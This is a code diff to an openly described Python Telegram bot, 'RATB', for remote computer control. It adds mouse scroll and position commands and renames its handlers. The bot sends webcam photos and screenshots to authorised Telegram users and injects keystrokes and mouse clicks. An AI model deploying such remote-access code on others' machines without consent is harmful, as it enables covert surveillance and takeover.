@@ -1,3 +1,22 @@
+#!/usr/bin/env python3
+
+"""
+888b.    db    88888 888b. 
+8  .8   dPYb     8   8wwwP 
+8wwK'  dPwwYb    8   8   b 
+8  Yb dP    Yb   8   888P' 
+
+This is a simple bot for remote computer control via Telegram. It is not intended as a surveillance program.
+To configure the bot, you must make your own config from configs/default.json.
+
+https://github.com/superisuer/RATB
+"""
+
+# ---------------------------------
+# SETTINGS
+config_file = "configs/default.json" # JSON Config
+# ---------------------------------
+
 import cv2
 import os
 import logging
@@ -8,11 +27,6 @@ from telebot import *
 from telebot import types
 from datetime import datetime
 
-# ---------------------------------
-# SETTINGS
-config_file = "configs/default.json" # JSON Config
-# ---------------------------------
-
 try:
     f = open(config_file)
     data = json.loads(f.read()) # Reading from file
@@ -22,7 +36,7 @@ except Exception as e:
     exit()
 
 # ---------------------------------
-# DATA FROM CONFIG
+# LOAD DATA
 token = data["bot_token"]
 
 write_logs = data["write_logs"]
@@ -35,7 +49,6 @@ users_ids = data["bot_users"]
 
 if write_logs:
 	logging.basicConfig(level=logging.INFO, filename=file_logs,filemode=mode_logs, format=format_logs)
-
 
 rlgs = " "
 sysmode = 0
@@ -58,8 +71,7 @@ def start(message):
     markup.add(item1, item2, item3, item4, item5, item6)
     bot.send_message(message.chat.id, "📁 Select option:", reply_markup=markup)
 @bot.message_handler(func=lambda message: message.text == "📸 Camera")
-
-def button1(message):
+def camera_shot(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
@@ -78,7 +90,7 @@ def button1(message):
     photo.close()
 
 @bot.message_handler(func=lambda message: message.text == "🖥 Screenshot")
-def button2(message):
+def tg_screenshot(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
@@ -92,7 +104,7 @@ def button2(message):
     bot.send_photo(message.chat.id, scre)
 
 @bot.message_handler(func=lambda message: message.text == "⌨ Keyboard")
-def button3(message):
+def open_keyboard_menu(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
@@ -101,13 +113,13 @@ def button3(message):
     item32 = types.KeyboardButton("⌨ Backspace")
     item33 = types.KeyboardButton("⌨ Escape")
     item34 = types.KeyboardButton("⌨ Alt+Tab")
-    item35 = types.KeyboardButton("⌨ Windows+L")
+    item35 = types.KeyboardButton("⌨ Windows+E")
     backb = types.KeyboardButton("◀ Back")
     markup.add(item31, item32, item33, item34, item35,backb)
     bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)
-    
+
 @bot.message_handler(func=lambda message: message.text == "⌨ Enter")
-def button4(message):
+def keyboard_enter(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
@@ -115,7 +127,7 @@ def button4(message):
     bot.send_message(message.chat.id, "✅ Success!")
 
 @bot.message_handler(func=lambda message: message.text == "⌨ Backspace")
-def button5(message):
+def keyboard_bs(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
@@ -123,54 +135,78 @@ def button5(message):
     bot.send_message(message.chat.id, "✅ Success!")
 
 @bot.message_handler(func=lambda message: message.text == "⌨ Escape")
-def button6(message):
+def keyboard_esc(message):
     if not message.from_user.id in users_ids:
         return None
     press("esc")
     bot.send_message(message.chat.id, "✅ Success!")
 
 @bot.message_handler(func=lambda message: message.text == "⌨ Alt+Tab")
-def button7(message):
+def keyboard_alttab(message):
     if not message.from_user.id in users_ids:
         return None
     hotkey('alt', 'tab')
     bot.send_message(message.chat.id, "✅ Success!")
 
-@bot.message_handler(func=lambda message: message.text == "⌨ Windows+L")
-def button8(message):
+@bot.message_handler(func=lambda message: message.text == "⌨ Windows+E")
+def keyboard_win_e(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
-    hotkey('win', 'l')
+    hotkey('win', 'e')
     bot.send_message(message.chat.id, "✅ Success!")
 
 @bot.message_handler(func=lambda message: message.text == "🖱 Mouse")
-def button11(message):
+def open_mouse_menu(message):
     if not message.from_user.id in users_ids:
         return None
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     item31 = types.KeyboardButton("🖱 Click")
-    item32 = types.KeyboardButton("🖱 Double click")    
+    item32 = types.KeyboardButton("🖱 Double click") 
+    item33 = types.KeyboardButton("🖱 Get position")
+    item34 = types.KeyboardButton("🖱 Scroll Down")
+    item35 = types.KeyboardButton("🖱 Scroll Up")
     backb = types.KeyboardButton("◀ Back")
-    markup.add(item31, item32,backb)
+    markup.add(item31,item32,item33,item34,item35,backb)
     bot.send_message(message.chat.id, "📁 Mouse: Select option:", reply_markup=markup)
 
 @bot.message_handler(func=lambda message: message.text == "🖱 Click")
-def button12(message):
+def tg_click(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
     click()
 
+@bot.message_handler(func=lambda message: message.text == "🖱 Scroll Down")
+def tg_click(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    scroll(-400)
+
+@bot.message_handler(func=lambda message: message.text == "🖱 Scroll Up")
+def tg_click(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    scroll(400)
+
+@bot.message_handler(func=lambda message: message.text == "🖱 Get position")
+def tg_getposition(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    bot.send_message(message.chat.id, "✅ {}".format(position()))
+
 @bot.message_handler(func=lambda message: message.text == "🖱 Double click")
-def button13(message):
+def tg_dclick(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
     doubleClick()
 
 @bot.message_handler(func=lambda message: message.text == "📜 Logs")
-def button14(message):
+def open_logs(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
@@ -184,7 +220,7 @@ def button14(message):
             bot.send_message(message.chat.id, "❌ Неизвестная ошибка")
 
 @bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
-def button15(message):
+def open_settings_menu(message):
     if not message.from_user.id in users_ids:
         return None
     global rlgs
@@ -195,14 +231,14 @@ def button15(message):
     bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)
 
 @bot.message_handler(func=lambda message: message.text == "🌐 Language")
-def button16(message):
+def language_change(message):
     global rlgs
     if not message.from_user.id in users_ids:
         return None
     bot.send_message(message.chat.id, "🌐 Language will be soon...")
     
 @bot.message_handler(func=lambda message: message.text == "◀ Back")
-def button16(message):
+def tg_back(message):
     start(message)
 
 @bot.message_handler(content_types='text')
